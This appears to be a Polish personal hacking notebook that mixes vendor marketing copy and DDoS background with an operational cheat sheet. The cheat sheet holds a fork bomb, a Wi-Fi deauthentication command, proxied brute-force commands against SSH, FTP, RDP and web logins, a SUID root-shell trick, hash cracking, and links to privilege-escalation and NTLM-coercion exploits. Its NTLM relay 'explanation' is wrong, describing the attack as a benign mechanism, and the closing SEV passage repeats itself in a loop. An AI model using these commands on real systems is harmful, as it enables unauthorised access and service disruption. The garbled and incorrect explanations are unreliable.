Skuteczne ustalanie priorytetów wymaga przeprowadzenia oceny zagrożenia w oparciu o wagę podatności — przy użyciu ocen CVSS i innych kryteriów, takich jak znaczenie operacyjne aplikacji, której dotyczy luka. Jeśli chodzi o luki w zabezpieczeniach oprogramowania open source, musisz wiedzieć, czy zastrzeżony kod faktycznie wykorzystuje lukę w zabezpieczeniach komponentów open source. Jeśli funkcja podatnego komponentu nigdy nie jest wywoływana przez twój produkt, to jego ocena CVSS jest znacząca, ale nie ma wpływu ani ryzyka.

Mierz wyniki bezpieczeństwa aplikacji
Ważne jest, aby mierzyć i raportować powodzenie programu ochrony aplikacji. Zidentyfikuj wskaźniki, które są najważniejsze dla Twoich kluczowych decydentów i przedstaw je w łatwy do zrozumienia i praktyczny sposób, aby uzyskać poparcie dla Twojego programu.

Podawanie dyrektorom zbyt wielu wskaźników na wczesnym etapie może być przytłaczające i, szczerze mówiąc, niepotrzebne. Głównym celem jest wskazanie, w jaki sposób program bezpieczeństwa aplikacji jest zgodny z wewnętrznymi politykami oraz pokazanie wpływu w zakresie redukcji podatności i zagrożeń oraz zwiększenia odporności aplikacji.

Zarządzaj uprawnieniami
Ważne jest, aby ograniczyć uprawnienia, szczególnie w przypadku systemów o znaczeniu krytycznym i wrażliwych. Najlepsze rozwiązania dotyczące bezpieczeństwa aplikacji ograniczają dostęp do aplikacji i danych do tych, którzy ich potrzebują, kiedy ich potrzebują — jest to znane jako zasada najmniejszych uprawnień. Najmniejsze przywileje mają kluczowe znaczenie z dwóch powodów:

Hakerzy mogą naruszyć mniej uprzywilejowane konta i ważne jest, aby upewnić się, że nie mogą uzyskać dostępu do wrażliwych systemów.
Zagrożenia wewnętrzne są tak samo niebezpieczne, jak napastnicy zewnętrzni. Jeśli wtajemniczeni się zepsują, ważne jest, aby upewnić się, że nigdy nie będą mieli więcej przywilejów niż powinni – ograniczając szkody, jakie mogą wyrządzić.
Bezpieczeństwo aplikacji dzięki Imperva
Imperva zapewnia kompleksową ochronę aplikacji, interfejsów API i mikrousług:

Zapora aplikacji sieci Web — zapobiegaj atakom dzięki światowej klasy analizie ruchu internetowego kierowanego do aplikacji.

Runtime Application Self-Protection (RASP) — wykrywanie ataków w czasie rzeczywistym i zapobieganie im ze środowiska wykonawczego aplikacji jest dostępne wszędzie tam, gdzie znajdują się aplikacje. Powstrzymaj zewnętrzne ataki i zastrzyki oraz zmniejsz zaległości w zabezpieczeniach.

Bezpieczeństwo API — zautomatyzowana ochrona API zapewnia ochronę punktów końcowych API w miarę ich publikowania, chroniąc aplikacje przed wykorzystaniem.

Zaawansowana ochrona przed botami — zapobiegaj atakom logiki biznesowej ze wszystkich punktów dostępu — witryn internetowych, aplikacji mobilnych i interfejsów API. Uzyskaj bezproblemowy wgląd i kontrolę nad ruchem botów, aby powstrzymać oszustwa online poprzez przejęcie konta lub konkurencyjne ceny.

Ochrona przed atakami DDoS — Blokuj ruch ataków na brzegu sieci, aby zapewnić ciągłość biznesową z gwarantowanym czasem pracy bez wpływu na wydajność. Zabezpiecz swoje zasoby lokalne lub w chmurze — niezależnie od tego, czy są hostowane w AWS, Microsoft Azure czy Google Public Cloud.

Analiza ataków — zapewnia pełną widoczność dzięki uczeniu maszynowemu i wiedzy o domenie w całym stosie zabezpieczeń aplikacji, aby ujawniać wzorce w hałasie i wykrywać ataki na aplikacje, umożliwiając izolowanie i zapobieganie kampaniom ataków.

Ochrona po stronie klienta — uzyskaj wgląd i kontrolę nad kodem JavaScript innych firm, aby zmniejszyć ryzyko oszustw w łańcuchu dostaw, zapobiegać naruszeniom danych i atakom po stronie klienta.

------------------------------------------------------------------------------------------------------
Najczęstsze ataki dos/ddos

Ataki oparte na woluminach
Obejmuje powodzi UDP, powodzi ICMP i innych powodzi sfałszowanych pakietów. Celem ataku jest nasycenie przepustowości zaatakowanej strony, a wielkość jest mierzona w bitach na sekundę (Bps).

Ataki na protokoły 
Obejmuje powodzie SYN, ataki pofragmentowanych pakietów, Ping of Death, Smurf DDoS i inne. Ten typ ataku zużywa rzeczywiste zasoby serwera lub pośredniego sprzętu komunikacyjnego, takiego jak zapory ogniowe i systemy równoważenia obciążenia , i jest mierzony w pakietach na sekundę (Pps).

Ataki w warstwie aplikacji 
Obejmuje ataki typu low-and-slow, powodzie GET/POST, ataki skierowane na podatności Apache, Windows lub OpenBSD i inne. Celem tych ataków, składających się z pozornie uzasadnionych i niewinnych żądań, jest awaria serwera WWW, a ich wielkość jest mierzona w żądaniach na sekundę (Rps).
------------------------------------------------------------------------------------------------------

**OTWARTE PORTY DO WYKORZYSTYWANIA:**
- 21/tcp otwarte ftp vsftpd 2.3.4
- 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protokół 2.0)
- 23/tcp otwarty telnet Linux telnetd
- 25/tcp otwórz smtp Postfix smtpd
- 53/tcp otwarta domena ISC BIND 9.4.2
- 80/tcp otwarty http Apache httpd 2.2.8 ((Ubuntu) DAV/2)
- Filtrowany pop 110/tcp3
- 111/tcp otwarty rpcbind 2 (RPC #100000)
- 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (grupa robocza: WORKGROUP)
- 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (grupa robocza: WORKGROUP)
- 512/tcp open exec netkit-rsh rexecd
- 513/tcp otwarte logowanie OpenBSD lub Solaris rlogind
- 514/tcp otwarta powłoka Netkit rshd
- 1099/tcp otwórz rmiregistry GNU Classpath grmiregistry
- 1524/tcp otwarta powłoka Metasploitable powłoka główna
- 2049/tcp otwarte nfs 2-4 (RPC #100003)
- 2121/tcp otwarty ftp ProFTPD 1.3.1
- 3306/tcp otwórz mysql MySQL 5.0.51a-3ubuntu5
- 5432/tcp otwarte postgresql PostgreSQL DB 8.3.0 - 8.3.7
- 5900/tcp otwarte vnc VNC (protokół 3.3)
- 6000/tcp otwarte X11 (odmowa dostępu)
- 6667/tcp otwarty IRC UnrealIRCd
- 8009/tcp otwarty ajp13 Apache Jserv (Protokół v1.3)
- 8180/tcp otwarty silnik http Apache Tomcat/Coyote JSP 1.1

https://www.exploit-db.com/google-hacking-database


* SMTP ( Simple Mail Transfer Protocol) - Służy do obsługi wysyłania wiadomości e-mail. 
* POP3 (Post Office Protocol) — odpowiada za przesyłanie poczty e-mail między klientem a serwerem pocztowym. 
IMAP (Internet Message Access Protocol) —  odpowiada za przesyłanie wiadomości e-mail między klientem a serwerem pocztowym. 
![805172273b08debff6a0c2af033c63fa.png](:/e543746967c4426b9e04450b7a88a105)

Zmienając rekordy DNS tak, aby zawierały listę Sender Policy Frramework (SPF) mozna określić który serwery mogą wysyłać wiadomości e-mail z mojej domeny.

Wdrażając DKIM można udowodnić ze wiadomość e-mail został wysłany z Mojej domeny. 

Fork bomba jest formą ataku typu „odmowa usługi” (DoS) na system oparty na Linuksie lub Uniksie . Wykorzystuje działanie. :(){ :|:& };: zwana również wirusem królika lub wabbit) to atak typu „odmowa usługi”, w którym proces nieustannie się replikuje, aby wyczerpać dostępne zasoby systemowe, spowalniając lub powodując awarię systemu z powodu braku zasobów .

atak deauthentication - pozwala nam odłączyć dowolne urządzenie od dowolnej sieci, która znajduje się w naszym zasięgu, nawet jeśli sieć ma szyfrowanie lub używa klucza. będziemy udawać klienta i wysłać pakiet deauthentication do routera, zmieniając nasz adres MAC na adres MAC klienta i informując router, że chcemy się od ciebie odłączyć. W tym samym czasie będziemy udawać router, zmieniając nasz adres MAC na adres MAC routera, aż do momentu odłączenia klienta, którego żądamy. Następnie połączenie zostanie utracone

![deauthenticate-the-wireless-client.png](:/256ceb7ed9734324b38cbcaadbc521d8)

POLECENIE - aireplay-ng --deauth 100000 -a [NetworkMac] -c [TargetMac] [wlan0/eth0]

port 21 , który jest portem FTP. FTP to rodzaj usługi, która jest instalowana, aby umożliwić użytkownikom przesyłanie i pobieranie plików ze zdalnego serwera. Usługa FTP zwykle używa nazwy użytkownika i hasła, ale widzimy, że ta usługa została źle skonfigurowana i umożliwia anonimowe logowanie przez FTP. W ten sposób będziemy mogli zalogować się bez hasła
![server-side-attack-basics2.png](:/bef96ccf939e41b79f955760bcef3a4c)
Wszystko, co musimy zrobić, to pobrać klienta FTP, takiego jak FileZilla . Teraz będziemy mogli łączyć się za pomocą tego adresu IP na porcie 21. Możemy również wygooglować serwer FTP, który w naszym przypadku to vsftpd 2.3.4 , i sprawdzić, czy ma jakieś problemy, czy ma jakieś błędy w konfiguracji lub czy zawiera wszelkie znane luki w wykonywaniu kodu. Kiedy już to wygooglujemy, zobaczymy, że vsftpd 2.3.4

port 512 - Komputer docelowy działa na Ubuntu i widzimy, że tutaj używa usługi rsh-client do połączenia. Dlatego musimy zainstalować pakiet rsh-client , aby połączyć się z tą usługą.
rlogin -l root IP

NARZĘDZIE PATATOR KOMENDA - proxychains patator ssh_login host=example.com user=root password=/home/kali/Desktop/mentalist/tests/first  0=/home/kali/Desktop/mentalist/tests/first -x ignore:mesg='Authentication failed.'

proxychains dmitry example.com -w -n -s -e -o output.out

sudo proxychains xprobe2 example.com

technika ataku typu adversary-in-the-middle (AitM) zdolną do ominięcia uwierzytelniania wieloskładnikowego

CAPEC-117: Przechwytywanie - Przeciwnik monitoruje strumienie danych do lub od celu w celu zbierania informacji. Atak ten można przeprowadzić wyłącznie w celu zebrania poufnych informacji lub w celu wsparcia dalszego ataku na cel. Ten wzorzec ataku może obejmować sniffowanie ruchu sieciowego, a także innych rodzajów strumieni danych (np. radiowych). Przeciwnik może próbować zainicjować ustanowienie strumienia danych lub pasywnie obserwować komunikację w miarę jej rozwoju. We wszystkich wariantach tego ataku przeciwnik nie jest zamierzonym odbiorcą strumienia danych. W przeciwieństwie do innych sposobów zbierania informacji (np. kierowanie wycieków danych), przeciwnik musi aktywnie pozycjonować się tak, aby obserwować wyraźne kanały danych (np. ruch sieciowy) i czytać zawartość. Jednak ten atak różni się od Adversary-In-the-Middle ( https://capec.mitre.org/data/definitions/94.html), ponieważ przeciwnik nie zmienia treści komunikatów ani nie przekazuje danych do zamierzonego odbiorcy.

Uzyskaj adres mac jednego z komputerów w klasie komputerów, aby przeprowadzić atak mac spoofing

Jak działają ataki łańcucha dostaw? Aby atak w łańcuchu dostaw zadziałał, hakerzy muszą wstawić złośliwy kod do oprogramowania lub znaleźć sposoby na złamanie zabezpieczeń protokołów lub komponentów sieciowych . Gdy odkryją możliwość włamania, wykorzystują ją, uzyskując dostęp do krytycznych zasobów cyfrowych

ftp anonymous login:
**sudo proxychains nmap -p 21 IP --script ftp-anon**
bruteforce: **proxychains  ncrack -U Username.txt -P Password.txt ftp://10.10.10.10**
Logowanie: **proxychains ftp IP
defultowe hasło i nazwa użytkownika: **anonymous**

BRUTEFORCE rdp:
SKANOWANIE: sudo proxychains nmap 10.10.10.0/24 -p 3389
 nmap -sV 10.10.10.10
SPRAWdZANIE: msfconsole
           use auxiliary/scanner/rdp/rdp_scanner
          set RHOSTS 10.10.10.10
          exploit
ATAK: ./crowbar.py --server 10.10.10.10/32 -b rdp -u /usr/share/usernames -C /usr/share/passwords
lub mogę użyć ncracka.
POŁĄCZENIE: xfreerdp /u:USERNAME /p:PASSWORd /v:10.10.10.10

znajdywanie podatnych: shodan search remote desktop
https://youtu.be/xEt5VSsLRho?list=LL
.
port 8081 Konsola użytkownika blackice-icecap" to oprogramowanie administracyjne dla systemu firewall.

Wireless Application Protocol (WAP) to specyfikacja zestawu protokołów komunikacyjnych w celu standaryzacji sposobu, w jaki urządzenia bezprzewodowe, takie jak telefony komórkowe i urządzenia nadawczo-odbiorcze, mogą być używane do dostępu do Internetu, w tym poczty e-mail, sieci WWW, grup dyskusyjnych i wiadomości błyskawicznych.

./enum4linux.pl -a IP

https://www.digitalocean.com/community/tutorials/5-common-server-setups-for-your-web-application

BRUTEFORCE SSH: proxychains medusa -h 10.10.10.10 -U Username.txt -P Password.txt -M ssh -n 22

FTP hacking: medusa -H hosts.txt -U users.txt -P pass.txt -M ftp -v 6

oraz
medusa -h 10.10.1.141 -U users.txt -P pass.txt -M ftp -w 07

BRUTEFORCE ONLINE:
 musisz określić typ ataku internetowego, niezależnie od tego, czy jest to „http-post-form”, „http-get-form”, czy też wykorzystuje uwierzytelnianie podstawowe. Następnie musisz określić ścieżkę do pliku do ataku. Następnie musisz określić parametry ataku (nazwę użytkownika i hasło). Ponadto musisz określić symbole zastępcze dla użytkownika i przekazać zmienne. Na koniec musisz określić wszelkie pliki cookie. Przykład tego możesz zobaczyć poniżej:

hydra -L users.txt -P password.txt 10.0.2.5  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V

**różne ataki o których mogłem nie słyszeć/zapomnieć:**
1. Ataki desynchronizujące

2. Techniki unikania WAF (wyróżniona  malformed chunk Pawła Hałdrzyńskiego)

3. Atakowanie interfejsów internetowych MS Exchange

4.ImageMagick - Wstrzyknięcie powłoki za pomocą hasła PDF

5.Nieuwierzytelniony RCE w MobileIron MDM

6.Przemycanie nagłówków HTTP przez odwrotne serwery proxy

7. Transmisja strumieniowa NAT

8.Kiedy TLS Cię zhakuje (SSRF często ma krytyczny wpływ, ale jeśli nie ma wygodnych usług internetowych, do których można by go skierować, może wydawać się frustrująco nieszkodliwy. When TLS Hacks You to technika inspirowana wstrzykiwaniem SNI autorstwa Joshua Maddux , która w elegancki sposób łączy ponowne wiązanie DNS i wznawianie sesji TLS w celu wykorzystania wewnętrznych usług, które nie obsługują protokołu HTTP. Jak to ujął deskryptor pliku, przywrócił gopher://!)

9. Atakowanie kontekstów drugorzędnych w aplikacjach internetowych

10. Przenośna filtracja danych: XSS dla plików PDF

11.Przemyt H2C: żądanie przemytu za pośrednictwem zwykłego tekstu HTTP/2

https://portswigger.net/research/top-10-web-hacking-techniques-of-2020-nominations-open

eskalacja uprawnień - plik binarny służący do zmiany hasła ma ustawiony bit SUID (/usr/bin/passwd) komenda - find / -user root -perm -4000 -exec ls -ldb {} \;
systemctl , to proces istniejący w systemach operacyjnych Linux, który służy do uruchamiania różnych usług, takich jak serwery Apache. Ze względu na poziom wpływu, jaki systemctl może mieć na system, jest on generalnie zarezerwowany dla uprzywilejowanych użytkowników, takich jak administratorzy systemu. Istnieją przypadki, w których uprawnienia do systemctl mogą być błędnie skonfigurowane, co pozwala na wykorzystanie ich do eskalacji uprawnień.

Zmieniając „id > /tmp/output” na „sh -p” lub „chmod +s /bin/bash”, a następnie uruchomić „bash -p” , mogę otrzymać powłokę root. Po śladach i błędach polecenie, które działało najlepiej, to „chmod + s /bin/bash”, a następnie „bash –p”

amanie hasha :

PRZYGOTOWYWANIE: echo 'hash' | > hash.txt
ŁAMANIE: john hash.txt --wordlist=rockyou.txt          #rockyou.txt to nazwa listy haseł.

 27 ways to learn ethical hacking for free:

1. Root Me — Challenges.
2. Stök's YouTube — Videos.
3. Hacker101 Videos — Videos.
4. InsiderPhD YouTube — Videos.
5. EchoCTF — Interactive Learning.
6. Vuln Machines — Videos and Labs.
7. Try2Hack — Interactive Learning.
8. Pentester Land — Written Content.
9. Checkmarx — Interactive Learning.
10. Cybrary — Written Content and Labs.
11. RangeForce — Interactive Exercises.
12. Vuln Hub — Written Content and Labs.
13. TCM Security — Interactive Learning.
14. HackXpert — Written Content and Labs.
15. Try Hack Me — Written Content and Labs.
16. OverTheWire — Written Content and Labs.
17. Hack The Box — Written Content and Labs.
18. CyberSecLabs — Written Content and Labs.
19. Pentester Academy — Written Content and Labs.
20. Bug Bounty Reports Explained YouTube — Videos.
21. Web Security Academy — Written Content & Labs.
22. Securibee's Infosec Resources — Written Content.
23. Jhaddix Bug Bounty Repo — Written Content.
24. Zseano's Bug Bounty Methodology — Free Ebook.
25. Awesome AppSec GitHub — Written Content.
26. NahamSec's Bug Bounty Repo — Written Content.
27. Kontra Application Security — General Learning.

	SSRF - https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/

BLOODHOUND - sudo neo4j console
firefox: localhost:7474
start bloodhound

## PrintNightmare: 
była krytyczną luką w zabezpieczeniach systemu operacyjnego Microsoft Windows . Luka wystąpiła w usłudze bufora wydruku . Były dwa warianty, jeden umożliwiający zdalne wykonanie kodu (CVE-2021-34527), a drugi prowadzący do eskalacji uprawnień (CVE-2021-1675). Trzecia luka w zabezpieczeniach (CVE-2021-34481) została ogłoszona 15 lipca 2021 r. i zaktualizowana do zdalnego wykonywania kodu przez firmę Microsoft w sierpniu.




PrivateEscalation: 
Zwykle zalecałbym uruchomienie LinEnum.sh lub LinPEAS, ale w tym przypadku TryHackMe wskazuje nam właściwy kierunek; będziemy nadużywać nieprawidłowego pliku binarnego SUID.

Następującego polecenia można użyć do znalezienia wszystkich plików binarnych w systemie, które mają ustawiony bit SUID:

znajdź / -perm -u=s -type f 2>/dev/null

**Pro-tip, uruchom to polecenie również na swoim komputerze Kali; pod warunkiem, że nie dodałeś żadnych plików binarnych SUID na własnej maszynie, jest to przydatne do sprawdzania krzyżowego w celu znalezienia niespójnych plików binarnych.




https://gtfobins.github.io/  <-->
Ta witryna zawiera listę kilku popularnych plików binarnych systemu Linux i sposobów ich wykorzystania w celu ominięcia lokalnych ograniczeń bezpieczeństwa.


https://github.com/samanL33T/Awesome-Mainframe-Hacking
„System komputerowy typu mainframe” odnosi się do dużego, wydajnego i scentralizowanego systemu komputerowego przeznaczonego do przetwarzania ogromnych ilości danych i obsługi wielu użytkowników jednocześnie. Systemy mainframe są często używane przez duże organizacje i agencje rządowe do wykonywania krytycznych funkcji, takich jak transakcje finansowe, zarządzanie opieką zdrowotną i badania naukowe.

hydra.exe -q -v -V -t 30 -L _logins.txt -P _passwords.txt -M _servers.txt -o ./__results.txt http-post-form "/ui/#/login:<koperta xmlns ='http\://schemas.xmlsoap.org/soap/envelope/' xmlns\:xsi='http\://www.w3.org/2001/XMLSchema-instance'><Body><Login xmlns=' urn\:vim25'><_this type='SessionManager'>ha-sessionmgr</_this><userName>^USER^</userName><password>^PASS^</password><locale>en-US</locale </Login></Body></Envelope>:S=Cannot"

Ta komenda wykorzystuje narzędzie Hydra do przeprowadzenia ataku typu "brute force" na stronie internetowej. Poniżej opis poszczególnych parametrów:

hydra.exe - plik wykonywalny narzędzia Hydra
-q -v -V - parametry wypisujące komunikaty o błędach, postępach i wynikach działania programu
-t 30 - liczba wątków używanych do ataku, w tym przypadku 30
-L _logins.txt - plik zawierający listę loginów, które będą używane podczas ataku. Loginy są zapisane w pliku _logins.txt.
-P _passwords.txt - plik zawierający listę haseł, które będą używane podczas ataku. Hasła są zapisane w pliku _passwords.txt.
-M _servers.txt - plik zawierający listę adresów serwerów, które będą atakowane. Adresy serwerów są zapisane w pliku _servers.txt.
-o ./__results.txt - plik wynikowy, w którym zostaną zapisane wyniki ataku. Wyniki zostaną zapisane w pliku __results.txt.
http-post-form - metoda HTTP, która zostanie użyta podczas ataku.
"/ui/#/login:<koperta xmlns ='http://schemas.xmlsoap.org/soap/envelope/' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'><Body><Login xmlns=' urn\:vim25'><_this type='SessionManager'>ha-sessionmgr</_this><userName>^USER^</userName><password>^PASS^</password><locale>en-US</locale </Login></Body></Envelope>:S=Cannot" - przy użyciu metody HTTP POST, atakujący próbuje zalogować się na stronie /ui/#/login, używając listy loginów i haseł z plików _logins.txt i _passwords.txt. Znaczniki ^USER^ i ^PASS^ zostaną zastąpione odpowiednio loginem i hasłem z listy.



 uzyskanie w pełni kwalifikowanej nazwy domeny: `crackmapexec smb <IP>`
(Można podać zakres adresów IP) Lub `nmap <IP> -p 445,137,138 --script smb-os-discovery`



## **Find Servers behind tor:**
- server status webrequest (unset hta), front end caching (misconfigured varnish), Carnegie Melon method, Global viewership and other techniques detailed by Neal (guy from fotoforensics), SSL Cert sometimes, messing up modprox, so on

- The onion service only needs to bind to the localhost. If it is configured for an interface IP it might be found because of unique attributes like HTTP headers.

- https://riseup.net/ca/security/network-security/tor/onionservices-best-practices#be-careful-of-localhost-bypasses

Blockchain to rozproszona baza danych lub rejestr, który jest współdzielony między węzłami sieci komputerowej. Jako baza danych, blockchain przechowuje informacje elektronicznie w formacie cyfrowym. Ethereum to protokół blockchain, taki jak bitcoin. W przeciwieństwie do Bitcoin, Ethereum jest Turing-complete, co oznacza, że ​​może z grubsza naśladować aspekty obliczeniowe dowolnego innego komputera ogólnego przeznaczenia i uruchamiać programy w świecie rzeczywistym.

eskalacja uprawnień np. windows 11/10, server 2012/20 - https://github.com/BeichenDream/GodPotato


=========================================================
Nowa forma ataku na przekaźnik Windows NTLM wykorzystuje rozproszony system plików MS-DFSNM do przejęcia kontroli nad domeną. link do PoC - https://github.com/Wh04m1001/DFSCoerce

WYTŁUMACZENIE: Przekaźnik Windows NTLM jest mechanizmem uwierzytelniania, który umożliwia użytkownikom korzystanie z zasobów sieciowych. System ten wykorzystuje protokół NTLM (NT LAN Manager) do autoryzacji użytkowników.

Rozproszony system plików MS-DFSNM (Microsoft Distributed File System Namespace Management) służy do zarządzania i udostępniania zasobów plikowych w sieciach rozproszonych. Jest to usługa, która umożliwia tworzenie wirtualnej struktury katalogów, która ukrywa faktyczną lokalizację plików i folderów na serwerach.

Przekaźnik Windows NTLM wykorzystuje rozproszony system plików MS-DFSNM, aby przekierować zapytania uwierzytelniające do właściwych serwerów w sieci. Dzięki temu użytkownicy mogą korzystać z zasobów sieciowych bez konieczności znać ich dokładnej lokalizacji.

W praktyce, kiedy użytkownik próbuje uzyskać dostęp do zasobów sieciowych, przekaźnik Windows NTLM przekierowuje jego zapytanie do serwera MS-DFSNM. Następnie MS-DFSNM sprawdza, gdzie znajdują się właściwe pliki i przekierowuje zapytanie do odpowiedniego serwera w sieci. Po autoryzacji użytkownika, serwer przekazuje odpowiedź do przekaźnika Windows NTLM, który następnie przekazuje ją z powrotem do użytkownika.

Dzięki temu mechanizmowi użytkownicy mogą korzystać z zasobów sieciowych, bez konieczności znajomości ich faktycznej lokalizacji. Rozproszony system plików MS-DFSNM działa jako pośrednik, który zapewnia efektywny dostęp do zasobów sieciowych i ułatwia zarządzanie nimi.
============================================================


ttps://itpracticetest.online
https://dl.acm.org/

https://redteam.guide/docs/checklists/red-team-checklist/
http://redteam.guide/

## zawsze sprawdzać foldery nie ls tylko ls -la -ls

poradnik do narzedzia git https://asciinema.org/a/24072


TLS - https://github.com/projectdiscovery/tlsx

nauka cobalt strike - https://github.com/zer0yu/Awesome-CobaltStrike

classic - https://owasp.org/

gamepwn - https://www.hackthebox.com/blog/intro-to-gamepwn-aka-game-hacking

przydatne polecenia PowerShell:

`powershell -c "Get-Service"`
To polecenie wyświetla listę wszystkich usług uruchomionych w celu Windows. Znajomość usług działających na celu pozwala określić potencjalne wektory ataku. Jako obrońca, użycie tego polecenia ujawnia powierzchnię ataku i może ujawnić potencjalnie złośliwe usługi działające na twoim punkcie końcowym.

`Get-ChildItem -Path C:\ -Include *[FILENAME]* -File -Recurse -ErrorAction SilentlyContinue`
To polecenie pomaga znaleźć lokalizację określonego pliku w miejscu docelowym. Jest to szczególnie przydatne w przypadku zdarzeń przechwytywania flagi (CTF) , gdy ogólnie znasz nazwę flagi, ale możesz nie wiedzieć, gdzie jest przechowywana.

`Get-LocalUser`


hashowanie tekstu przez kali linux, komenda: `echo -n 'MyPassword' | md5sum`

https://www.orangecyberdefense.com/global/blog/ethical-hacking/ethical-hacking-all-about-physical-intrusions


**Wyodrębnianie sekretów z zaszyfrowanych maszyn wirtualnych**:
AMD SEV to sprzętowe rozszerzenie szyfrowania pamięci głównej w systemach z wieloma dzierżawcami. SEV wykorzystuje wbudowany koprocesor, AMD Secure Processor, do przezroczystego szyfrowania pamięci maszyny wirtualnej za pomocą indywidualnych, efemerycznych kluczy, które nigdy nie opuszczają koprocesora. Celem jest ochrona poufności pamięci dzierżawców przed złośliwym lub zagrożonym hypervisorem oraz przed atakami na pamięć, na przykład poprzez zimny rozruch lub DMA. Atak SEVered pokazał, że hiperwizor może jednak wyodrębnić pamięć w postaci zwykłego tekstu z maszyn wirtualnych zaszyfrowanych SEV bez dostępu do ich kluczy szyfrujących. Jednak szyfrowanie utrudnia tradycyjnym technikom introspekcji maszyny wirtualnej lokalizowanie sekretów w pamięci przed wyodrębnieniem. Może to wymagać wyodrębnienia dużej ilości pamięci w celu odzyskania określonych sekretów, a tym samym skutkować czasochłonnym, oczywistym atakiem. Przedstawiamy podejście, które umożliwia złośliwemu hypervisorowi szybką identyfikację i kradzież tajemnic, takich jak klucze TLS, SSH czy FDE, z zaszyfrowanych maszyn wirtualnych na obecnym sprzęcie SEV. Najpierw obserwujemy aktywność maszyny wirtualnej z poziomu hiperwizora, aby wywnioskować, które obszary pamięci najprawdopodobniej zawierają sekrety. Następnie systematycznie wyodrębniamy te obszary pamięci i na bieżąco analizujemy ich zawartość. Pozwala to na skuteczne odzyskiwanie ukierunkowanych tajemnic, znacznie zwiększając szanse na szybką, solidną i ukrytą kradzież. Klucze SSH lub FDE z zaszyfrowanych maszyn wirtualnych na obecnym sprzęcie SEV. Najpierw obserwujemy aktywność maszyny wirtualnej z poziomu hiperwizora, aby wywnioskować, które obszary pamięci najprawdopodobniej zawierają sekrety. Następnie systematycznie wyodrębniamy te obszary pamięci i na bieżąco analizujemy ich zawartość. Pozwala to na skuteczne odzyskiwanie ukierunkowanych tajemnic, znacznie zwiększając szanse na szybką, solidną i ukrytą kradzież. Klucze SSH lub FDE z zaszyfrowanych maszyn wirtualnych na obecnym sprzęcie SEV. Najpierw obserwujemy aktywność maszyny wirtualnej z poziomu hiperwizora, aby wywnioskować, które obszary pamięci najprawdopodobniej zawierają sekrety. Następnie systematycznie wyodrębniamy te obszary pamięci i na bieżąco analizujemy ich zawartość. Pozwala to na skuteczne odzyskiwanie ukierunkowanych tajemnic, znacznie zwiększając szanse na szybką, solidną i ukrytą kradzież.